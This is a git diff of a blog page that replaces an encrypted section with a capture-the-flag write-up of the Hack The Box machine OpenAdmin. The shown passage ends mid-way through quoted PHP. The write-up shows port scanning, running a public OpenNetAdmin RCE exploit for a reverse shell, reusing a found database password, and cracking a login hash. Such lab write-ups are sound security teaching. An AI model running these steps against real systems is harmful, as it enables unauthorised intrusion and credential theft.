@@ -65,7 +65,7 @@
   "description" : "Let&amp;rsquo;s pwn OpenAdmin from Hack The Box. This box is quite easy, as there are multiple ways to get the user flag. One part of the solution I used below is too easy in my opinion, as it could be caused by the overlook of the box creator.
 ",
   "inLanguage" : "en",
-  "wordCount": 1025,
+  "wordCount": 969,
   "datePublished" : "2020-04-29T23:39:12",
   "dateModified" : "2020-04-29T23:39:12",
   "image" : "https://erbazz.github.io",
@@ -236,22 +236,99 @@ if (!doNotTrack) {
 <strong>IP:</strong> 10.10.10.171<br/>
 <strong>Date Cleared:</strong> 20 Apr 2020</p>
 <p><strong><a href="/writeup/htb_openadmin_th/">สำหรับ Writeup ภาษาไทย กดที่ Link นี้ได้เลยครับ</a></strong></p>
-<div class="hugo-encryptor-container">
-<div class="hugo-encryptor-prompt">
-<h3>This Writeup is Encrypted</h3>
-<p>Writeups for active machines are only accessible to people who have cleared them.</p>
-<h4>Unlocking</h4>
-<p><strong>Linux Machine:</strong> Use the <strong style="color: #c7254e">Root password hash</strong> from <code>/etc/shadow</code> (copy from <code>root</code> to <code>:::</code>)<br/>
-        For example: <strong><code>root:$6$BGk6CBPE$FoDCUgY.1p——redacted——cw/D/3ubU/:18222:0:99999:7:::</code></strong></p>
-<p><strong>Windows Machine:</strong> Use the <strong style="color: #c7254e">Administrator SAM hash</strong> (copy from <code>Administrator</code> to <code>:::</code>)<br/>
-        For example: <strong><code>Administrator:500:aad3b435b51404eeaa——redacted——80c4fd1448319a8c04f:::</code></strong></p><p></p>
-</div>
-<div class="hugo-encryptor-form">
-<input class="hugo-encryptor-input" id="hash-input" placeholder="Insert your hash here" type="password"/>
-<input class="hugo-encryptor-button" id="decrypt-button" onclick="_click_handler(this)" type="button" value="Unlock"/>
-</div>
-<div class="hugo-encryptor-cipher-text" style="display: none;">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</div>
-</div>
+<h2 id="information-gathering">Information Gathering</h2>
+<p>Starting with <code>nmap</code> as usual, we can see that there are two open ports, <code>ssh</code> on 22, and <code>http</code> on <code>80</code>.</p>
+<pre><code>PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<h3 id="port-80">Port 80</h3>
+<p>On port <code>80</code>, there is an Apache2 Default Page on the home page.</p>
+<p><img alt="" src="/images/htb_openadmin/80_home.png"/></p>
+<p>Using <code>gobuster</code>, several interesting paths were found.</p>
+<p><img alt="" src="/images/htb_openadmin/80_gobuster.png"/></p>
+<p>After accessing them one by one, we can see that they are just static template webpages with placeholder text.</p>
+<p><img alt="" src="/images/htb_openadmin/80_artwork.png"/></p>
+<p><img alt="" src="/images/htb_openadmin/80_sierra.png"/></p>
+<p><img alt="" src="/images/htb_openadmin/80_music.png"/></p>
+<p>However, on the music page, the Login button links to <a href="http://10.10.10.171/ona">http://10.10.10.171/ona</a>. The page is hosting <code>OpenNetAdmin 18.1.1</code>.</p>
+<p><img alt="" src="/images/htb_openadmin/80_ona.png"/></p>
+<p>Using Google search, we can see that the version is vulnerable to RCE.</p>
+<p><img alt="" src="/images/htb_openadmin/ona_rce.png"/></p>
+<h2 id="exploitation">Exploitation</h2>
+<p>I downloaded an exploit script from <a href="https://raw.githubusercontent.com/amriunix/ona-rce/master/ona-rce.py">https://raw.githubusercontent.com/amriunix/ona-rce/master/ona-rce.py</a> and run it with the command <code>python3 ona-rce.py exploit http://10.10.10.171/ona/</code> to get a reverse shell.</p>
+<p><img alt="" src="/images/htb_openadmin/80_ona_rev.png"/></p>
+<p>Digging through the files, I found an interesting config file containing db password <code>n1nj4W4rri0R!</code>.</p>
+<p><img alt="" src="/images/htb_openadmin/dbsetting.png"/></p>
+<p>Looking at the home directory, we can see two users, <code>jimmy</code> and <code>joanna</code>. I was able to login with the user <code>jimmy</code> using the password found.</p>
+<p><img alt="" src="/images/htb_openadmin/user.png"/></p>
+<p>At this point, I just used <code>ssh</code> to connect to the server and dig further.</p>
+<p>I then found an interesting path, <code>/var/www/internal</code>, owned by <code>jimmy</code>.</p>
+<p><img alt="" src="/images/htb_openadmin/internal.png"/></p>
+<p>The <code>index.php</code> page contains a login form. The username must be <code>jimmy</code>, and the <code>sha512</code> hash of the password must match.</p>
+<p><img alt="" src="/images/htb_openadmin/internal_index.png"/></p>
+<p>The <code>main.php</code> page prints out the private key of <code>joanna</code>.</p>
+<p><img alt="" src="/images/htb_openadmin/internal_main.png"/></p>
+<p>Now can roughly guess the steps we need to take. Find the correct password, log in, get the private key, and use the key to login as <code>joanna</code>.</p>
+<p>Starting from the password, I used <a href="https://crackstation.net/">https://crackstation.net/</a> to crack the hash, and found that the password is <code>Revealed</code>.</p>
+<p><img alt="" src="/images/htb_openadmin/internal_index_crack.png"/></p>
+<p>To log in, we need to know the port that these pages are hosted on. Knowing that the web server is <code>apache</code>, we can find the configuration files in <code>/etc/apache2/</code>. I found that the <code>/var/www/internal</code> path is hosted on port <code>52846</code>.</p>
+<p><img alt="" src="/images/htb_openadmin/internal_apache.png"/></p>
+<p>Remember the <code>nmap</code> result? Yes, the port <code>52846</code> is not open from the outside, so we can only access it internally from the target machine using <code>curl</code>.</p>
+<p><strong>However, there’s a twist!</strong> Let’s look at the source code of <code>main.php</code> again.</p>
+<pre><code class="language-php">&lt;?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
+# Open Admin Trusted
+# OpenAdmin
